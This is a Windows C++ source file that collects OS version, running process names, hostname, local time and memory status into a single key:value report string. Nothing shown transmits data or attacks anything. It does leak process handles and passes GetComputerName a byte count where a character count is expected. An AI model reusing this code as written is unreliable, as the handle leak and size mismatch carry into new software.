#include "stdafx.h"
#include "Info.h"
#include "Util.h"
#include <Psapi.h>

// Use to convert bytes to MB
#define DIV 1048576

Info info;

static void GetProcessInfoStr(DWORD processID, TCHAR *dst, size_t size)
{
	std::string ret;
	TCHAR processName[MAX_PATH] = _T("unknown");
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
		FALSE, processID);

	if(hProcess == NULL) {
		return;
	}

	HMODULE hMod;
	DWORD bytesNeeded;

	if(EnumProcessModules(hProcess, &hMod, sizeof(hMod), &bytesNeeded)) {
		GetModuleBaseName(hProcess, hMod, processName,
			sizeof(processName) / sizeof(TCHAR));
		_tcscat_s(dst, size, processName);
	}
}

static std::string EnumerateProcesses()
{
	DWORD processes[1024];
	DWORD bytesNeeded;
	DWORD processCount;
	size_t i;
	std::string ret;

	if(!EnumProcesses(processes, sizeof(processes), &bytesNeeded)) {
		return "";
	}

	processCount = bytesNeeded / sizeof(DWORD);

	for(i = 0; i < processCount; i++) {
		if(processes[i] != 0) {
			TCHAR infoStr[2048] = { 0 };
			GetProcessInfoStr(processes[i], infoStr, 2048);

			char dest[2048] = { 0 };
			std::wcstombs(dest, infoStr, 2048);

			if(strlen(dest)) {
				ret += dest;
				ret += ";";
			}
		}
	}

	return ret;
}

static std::string GetHostname()
{
	TCHAR buffer[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD size = sizeof(buffer);
	std::string ret = "unknown";

	if(GetComputerName(buffer, &size) != 0) {
		char dest[MAX_COMPUTERNAME_LENGTH + 1];

		std::wcstombs(dest, buffer, MAX_COMPUTERNAME_LENGTH + 1);
		ret = dest;
	}

	return ret;
}

static std::string GetTime()
{
	SYSTEMTIME sysTime;
	std::string ret;

	ZeroMemory(&sysTime, sizeof(SYSTEMTIME));
	GetLocalTime(&sysTime);

	ret += std::to_string(sysTime.wDay);
	ret += ".";
	ret += std::to_string(sysTime.wMonth);
	ret += ".",
	ret += std::to_string(sysTime.wYear);
	ret += " ";
	ret += std::to_string(sysTime.wHour);
	ret += ":";
	ret += std::to_string(sysTime.wMinute);
	ret += ":";
	ret += std::to_string(sysTime.wSecond);

	return ret;
}

static std::string GetMemoryStatus()
{
	MEMORYSTATUSEX statex;
	std::string ret;

	statex.dwLength = sizeof(statex);
	GlobalMemoryStatusEx(&statex);

	ret += "total:";
	ret += std::to_string(statex.ullTotalPhys / DIV);
	ret += ";";

	ret += "free:";
	ret += std::to_string(statex.ullAvailPhys / DIV);
	ret += ";";

	return ret;
}

Info::Info()
{
}

Info::~Info()
{
}

std::string Info::GetInformation()
{
	std::string info;
	OSVERSIONINFO osVersionInfo;

	ZeroMemory(&osVersionInfo, sizeof(OSVERSIONINFO));
	osVersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

	// TODO: this function is deprecated since Windows 8?
	GetVersionEx(&osVersionInfo);

	info += "osVer:";
	info += std::to_string(osVersionInfo.dwMajorVersion);
	info += ".";
	info += std::to_string(osVersionInfo.dwMinorVersion);
	info += ".";
	info += std::to_string(osVersionInfo.dwBuildNumber);

	info += "\n";

	std::string procs = EnumerateProcesses();

	info += "procn:";
	info += std::to_string(Util::split(procs, ';').size());

	info += "\n";

	info += "procs:";
	info += procs;

	info += "\n";

	info += "hostname:";
	info += GetHostname();

	info += "\n";

	info += "time:";
	info += GetTime();

	info += "\n";

	info += "memory:";
	info += GetMemoryStatus();

	info += "\n";

	return info;
}